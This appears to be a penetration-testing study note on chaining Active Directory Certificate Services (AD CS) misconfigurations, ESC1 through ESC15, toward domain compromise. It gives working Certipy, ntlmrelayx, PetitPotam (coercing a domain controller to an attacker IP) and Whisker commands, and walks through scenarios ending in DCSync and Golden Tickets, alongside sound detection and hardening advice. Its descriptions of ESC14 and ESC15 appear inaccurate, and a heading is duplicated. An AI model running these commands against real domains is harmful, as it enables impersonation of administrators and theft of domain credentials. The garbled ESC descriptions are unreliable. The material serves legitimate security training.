---
tags: [active-directory, advanced, exotic, cross-forest, vapt]
difficulty: advanced
module: "78 - Active Directory Exotic Protocols and Cross-Forest"
topic: "78.04 AD CS ESC1-ESC15 Advanced Chaining"
---

# 78.04 - AD CS (Active Directory Certificate Services) ESC1-ESC15 Advanced Chaining

## 1. Deep Dive into Active Directory Certificate Services (AD CS)

Active Directory Certificate Services (AD CS) is Microsoft's native Public Key Infrastructure (PKI) implementation. It allows organizations to build and manage certificates for users, machines, and services. These certificates can be used for encryption, digital signatures, and, critically, **authentication** (e.g., smart card logon, client authentication).

Over the last few years, AD CS has become one of the most fruitful attack surfaces in Active Directory. Because certificates can be mapped to AD user accounts, misconfigured certificate templates or web enrollment endpoints allow attackers to request certificates on behalf of highly privileged accounts (like Domain Admins), thereby impersonating them.

SpecterOps fundamentally documented this attack surface, categorizing the vulnerabilities into distinct "ESC" (Escalation) techniques. As of recent research, these span from ESC1 to ESC15.

---

## 2. The Core Escalation Vectors (The "ESC" Framework)

While covering all 15 vectors requires an entire book, advanced VAPT engagements heavily focus on the most reliable and prevalent misconfigurations, specifically ESC1, ESC8, and the newer Shadow Credentials/Relay vectors.

### 2.1 ESC1: The Holy Grail of Misconfigurations
ESC1 occurs when a Certificate Template allows a low-privileged user to specify the `Subject Alternative Name (SAN)` in the certificate request, and the template allows for Client Authentication.

**Conditions for ESC1:**
1. Low-privileged users can enroll in the template.
2. The template requires no manager approval.
3. The template allows `Client Authentication` (EKU).
4. The template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled.

**Exploitation (Using Certipy):**
If an attacker finds an ESC1 vulnerable template, they can request a certificate and manually set the SAN to `Administrator@corp.local`.
```bash
# Requesting the certificate on behalf of Administrator
certipy req -u low_priv@corp.local -p Password123 -ca CORP-DC01-CA -template VulnerableTemplate -upn Administrator@corp.local -target dc01.corp.local
```
The CA issues the certificate. The attacker then uses this certificate to obtain a Kerberos TGT (via PKINIT) for the Administrator account.
```bash
# Authenticating via PKINIT to get the TGT and NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 2.2 ESC8: NTLM Relaying to AD CS HTTP Endpoints
AD CS supports web enrollment (e.g., `http://ca.corp.local/certsrv`). Critically, these IIS endpoints often support NTLM authentication but **fail to enforce EPA (Extended Protection for Authentication)** or require HTTPS/SMB signing by default.

**The Attack Chain (ESC8):**
1. The attacker coerces a highly privileged machine account (e.g., a Domain Controller) to authenticate to the attacker's machine over HTTP or SMB using tools like `PetitPotam` or `Coercer`.
2. The attacker uses `ntlmrelayx` to relay this incoming NTLM authentication to the CA's web enrollment endpoint.
3. `ntlmrelayx` requests a machine certificate for the coerced Domain Controller.
4. The attacker uses the DC's certificate to authenticate via PKINIT, dumping the domain hashes (DCSync).

```bash
# Set up the relay
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainControllers

# Coerce the Domain Controller
python3 PetitPotam.py attacker_ip dc01.corp.local
```

### 2.3 ESC13/14/15: The Modern Frontier
Newer ESC vectors involve complex interactions with cross-forest trusts, shadow credentials, and PKI components:
* **ESC13:** Involves exploiting Issuance Policies and OIDs. If a custom OID is mapped to a privileged group, requesting a cert with that OID grants the group privileges.
* **ESC14:** Exploits weak Registry permissions on the CA server itself, allowing an attacker to modify the `SubjectTemplate` or `EditFlags` to dynamically create an ESC1 scenario.
* **ESC15:** Focuses on vulnerabilities in how AD CS parses specific ASN.1 structures or weak cryptographic bindings in multi-tier PKI hierarchies.

---

## 3. Advanced Chaining Strategies

In mature environments, single vulnerabilities like pure ESC1 are becoming rare. Attackers must chain multiple lower-severity issues to achieve Domain Admin.

### 3.1 Chaining ESC8 -> RBCD -> DCSync
Imagine an environment where the CA web enrollment endpoint requires HTTPS (preventing standard ESC8 NTLM relay from SMB).

1. **Relay to LDAP:** The attacker coerces a target server and relays the NTLM authentication to LDAP (which may not require signing) to configure **Resource-Based Constrained Delegation (RBCD)** against a secondary server.
2. **Compromise Secondary Server:** Using RBCD, the attacker compromises the secondary server, extracting its machine account credentials.
3. **Internal Escalation:** The attacker uses the secondary server's credentials to identify a custom certificate template that allows ESC4 (Template modification).
4. **Modify Template (ESC4 to ESC1):** The attacker modifies the template to enable `ENROLLEE_SUPPLIES_SUBJECT` (creating an ESC1 condition).
5. **Execute ESC1:** The attacker requests a cert for DA, pulls the TGT, and DCSyncs the domain.

### 3.2 Shadow Credentials (ESC Key Trust Abuse)
If an attacker gains `GenericWrite` over a user or computer object, they can append a forged certificate to the target's `msDS-KeyCredentialLink` attribute. This is known as "Shadow Credentials."
The attacker then uses PKINIT to authenticate as the target using the injected key. This avoids resetting the password and is exceptionally stealthy.

```bash
# Using Whisker / Rubeus for Shadow Credentials
Whisker.exe add /target:AdminUser /domain:corp.local
# Output provides a Rubeus command to request the TGT using the generated certificate
```

---

## 4. Visualizing AD CS Exploitation (ASCII Architecture)

```text
  [ Attacker ]                               [ AD CS Server (CA) ]
       |                                              |
       | 1. Identify ESC1 Vulnerable Template         |
       |    (BloodHound / Certipy)                    |
       |--------------------------------------------->|
       |                                              |
       | 2. Request Cert via CSR                      |
       |    (SAN: Administrator@corp.local)           |
       |--------------------------------------------->|
       |                                              |
       | 3. CA Issues Certificate                     |
       |    (Fails to validate SAN against requester) |
       |<---------------------------------------------|
       |                                              |
       | 4. PKINIT Authentication                     v
       |-------------------------> [ Domain Controller ]
       |    (Presents DA Cert)                |
       |                                      | 5. Validates Cert
       | 6. Returns TGT & NTLM Hash           |
       |<-------------------------------------|
       v
  [ Total Domain Compromise ]
```

---

## 5. Defense, Detection, and Mitigation

### 5.1 Host and Event Telemetry

Detecting AD CS abuse requires strict auditing on the CA servers, which is typically disabled by default.
1. **Enable CA Auditing:** `certutil -setreg CA\AuditFilter 127`
2. **Event ID 4886 (Certificate Services received a certificate request):** Monitor for anomalous templates being requested.
3. **Event ID 4887 (Certificate Services approved a certificate request):** Crucial for detecting issued certificates. Correlate the Requester identity with the Subject Name. If they differ significantly, it may be ESC1.
4. **Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):** When PKINIT is used, the event will contain certificate information in the `Certificate Issuer Name` and `Certificate Serial Number` fields.

### 5.2 Hardening the Infrastructure

* **Kill ESC1:** Audit all templates. Remove `ENROLLEE_SUPPLIES_SUBJECT` from any template that allows Client Authentication and is accessible by unprivileged users. Ensure Manager Approval is required for SAN-supplied certs.
* **Kill ESC8:** Enforce Extended Protection for Authentication (EPA) and require HTTPS on the AD CS Web Enrollment (IIS) components. Disable NTLM on the CA entirely if possible.
* **Kill Shadow Credentials:** Monitor and restrict delegated control over the `msDS-KeyCredentialLink` attribute across the domain.

---

## 6. Real-World Scenario: The Overlooked Web Proxy

During a penetration test, the organization had completely secured their Certificate Templates (no ESC1-4). However, an old Web Enrollment proxy was left running on a forgotten utility server. 

1. The attacker utilized `Coercer` to force the primary Exchange server to authenticate to the attacker's IP.
2. The attacker relayed this NTLM auth to the forgotten Web Enrollment proxy using `ntlmrelayx`.
3. Because it was an older IIS instance, EPA was disabled. The proxy forwarded the request to the backend CA.
4. The CA issued a machine certificate for the Exchange Server.
5. The attacker utilized the Exchange Server certificate to perform PKINIT, gained a TGT, and modified domain groups, achieving Domain Admin without touching a single misconfigured template.

---


## Real-World Attack Scenario
## Real-World Attack Scenario

During the internal penetration testing phase, the assessment team identified an Active Directory Certificate Services (AD CS) instance running on `CA01.corp.local`. Initial enumeration using Certipy revealed multiple misconfigured certificate templates. While the standard ESC1 vectors had been patched, the team identified a vulnerable web enrollment endpoint (`http://ca01.corp.local/certsrv`) that lacked Extended Protection for Authentication (EPA) and HTTPS enforcement, leaving it susceptible to an ESC8 NTLM relay attack.

To execute the attack, the team first positioned a rogue responder on the network and used Coercer to force the primary Domain Controller (`DC01.corp.local`) to authenticate to the attacker-controlled IP address over MS-RPC. The incoming NTLM authentication was immediately relayed using `ntlmrelayx.py` to the vulnerable HTTP web enrollment endpoint. The relay successfully requested a machine certificate for the coerced Domain Controller using the standard `DomainControllers` template.

With the forged Domain Controller certificate in hand, the team utilized PKINIT to request a Kerberos Ticket Granting Ticket (TGT) on behalf of `DC01$`. This authentication yielded the NT hash of the Domain Controller, effectively granting the team DCSync privileges. The team then executed `secretsdump.py` to extract the `krbtgt` hash, successfully forging a Golden Ticket and achieving full Domain Admin compromise without directly exploiting any Active Directory ACL misconfigurations.

## Chaining Opportunities
* **NTLM Coercion:** Using PetitPotam, DFSCoerce, or ShadowCoerce to feed ESC8. [[15 - NTLM Coercion Techniques]]
* **DCSync:** The final objective after obtaining a DA certificate. [[05 - DCSync and LSA Extraction]]
* **RBCD Abuse:** Chaining ESC vectors with Resource-Based Constrained Delegation. [[09 - Kerberos Delegation Abuse]]

## Related Notes
* [[01 - Active Directory Architecture and NTDS.DIT]]
* [[10 - Shadow Credentials and Key Trust]]
* [[08 - Intra-Forest Privilege Escalation]]

---
*End of Document*
